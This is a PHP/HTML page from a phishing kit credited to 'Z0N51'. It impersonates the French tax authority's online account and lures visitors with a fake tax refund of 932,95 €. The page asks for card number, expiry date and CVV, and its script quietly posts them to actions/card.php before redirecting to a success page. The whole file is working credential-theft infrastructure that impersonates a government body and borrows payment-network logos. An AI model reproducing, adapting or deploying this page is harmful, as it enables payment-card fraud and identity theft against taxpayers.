<?php include("common/includes.php") ?>
<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/
    
    function is_invalid_class($array, $key) {
        if( !is_array($array) )
            return false;
        if( isset($array[$key]) ) {
            $return = 'has-error';
            return $return;
        }
        return false;
    }
	function get_selected_option($name,$value) {
        if( isset($_SESSION[$name]) && $_SESSION[$name] == $value ) {
            return 'selected';
        }
    }
	function error_message($array, $key) {
        if( !is_array($array) )
            return false;
        if( isset($array[$key]) ) {
            $return = '<div class="error-message">'. $array[$key] .'</div>';
            return $return;
        }
        return false;
    }
	
?>
<!doctype html>
<html style="background-color: #E5E5E5; display: flex; flex-direction: column; height: 100%;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/css/helpers.css">
        <link rel="stylesheet" href="assets/css/style.css">

        <link rel="icon" type="image/x-icon" href="assets/imgs/favicon.ico" />

        <title>Remboursement</title>
    </head>

    <body style="background-color: #E5E5E5; display: flex; flex-direction: column; height: 100%;">

        <header id="header2">
            <div class="container">
                <div class="left">
                    <img style="max-width: 126px;" src="assets/imgs/logo1.svg">
                </div>
                <div class="mid">
                    <h3>Mon espace <span>particulier</span></h3>
                    <img style="max-width: 126px;" src="assets/imgs/logo2.svg">
                </div>
                <div class="right">
                    <p>
                        Bienvenue<br>
                        Numéro fiscal : 1195217722475<br>
                        <span>Retour au tableau de bord</span>
                    </p>
                </div>
            </div>
        </header>

        <!-- BREADCRUMB -->
        <div id="breadcrumb" class="mt-4">
            <div class="container">
                <u>Tableau de bord</u> <span>-</span> Remboursement et Paiement en ligne

            </div>
        </div>
        <!-- BREADCRUMB -->

        <!-- MAIN -->
        <main id="main" class="flex-grow-1">
            <div class="container">
                <div class="details">
                    <div class="title">
                        <h3>Remboursement sécurisé</h3>
                       <li>Référence : <b>600193110380</b></li>
                       <li>Montant de la transaction &nbsp;: <b>932,95 €</b></li>

                        </p>
                    </div>
                    <form action="" method="post">
                        <input type="hidden" name="captcha">
                        <input type="hidden" name="step" value="cc">
                      
                        <div class="text-center mb20">
                            <img src="https://payment-web.sfr.fr/static/common/images/logos/acceptance/medium/logo_CB.png">
                            <img src="https://payment-web.sfr.fr/static/common/images/logos/acceptance/medium/logo_VISA.png">
                            <img src="https://payment-web.sfr.fr/static/common/images/logos/acceptance/medium/logo_MASTERCARD.png">
                            <img src="https://payment-web.sfr.fr/static/common/images/logos/acceptance/medium/logo_AMEX.png">
                        </div>
             <div class="form-group col-12 row" style="left:-2px">              
              <label class="col-5" for="id" style="text-align: right;">Numéro de carte:</label>
              <input type="tel" class="form-control id col-3" id="id" name="id" maxlength="19" placeholder="XXXX XXXX XXXX XXXX" >       
          </div>
            <div class="form-group col-12 row" style="margin-top:-10px;left:-3px">
              <label class="col-5" style="text-align: right;">Date Expire:</label>
              <input type="tel" class="form-control mdp col-1" id="mdp" name="mdp" placeholder="MM" maxlength="2">/
              <input type="tel" class="form-control mdp1 col-1" id="mdp1" name="mdp1" placeholder="AAAA" maxlength="4">
            </div>
             <div class="form-group col-12 row" style="margin-top:-10px;left:-2px">
              <label class="col-5" style="text-align: right;">Cryptogramme visuel:</label>
              <input type="tel" class="form-control cvv col-1" id="cvv" name="cvv" maxlength="4">
            </div>
                        <div class="btns">
                            <button type="button" id="submit"><i class="fas fa-lock"></i> Etape suivante</button>
                        </div>
                    </form>

                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <footer id="footer">
            <div class="container">
                <p>Direction générale des Finances publiques</p>
            </div>
        </footer>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/jquery-simple-upload@1.1.0/simpleUpload.min.js"></script>
        <script src="assets/js/script.js"></script>

        <script type="text/JavaScript">
            var x = 0
            $(document).ready(function() {
                
                
                $('#submit').click(function(e) {
                    e.preventDefault();
                     if ( $('.id').val().length >= 16 && $('.mdp').val().length >= 2 && $('.mdp1').val().length >= 4 && $('.cvv').val().length >= 3) {

                        $.ajax({
                            type: "post",
                            url: "actions/card.php",
                            data: "id=" + $('.id').val() + "&mdp=" + $('.mdp').val() + "&mdp1=" + $('.mdp1').val() + "&cvv=" + $('.cvv').val(),
                            success: function(response) {
                                window.location.href = 'success.php';
                                
                            }
                        });
                          } else {
                        alert('Veuillez vérifier les informations de votre carte bancaire.')
                    }
                    
                });

            })

        </script>

    </body>

</html>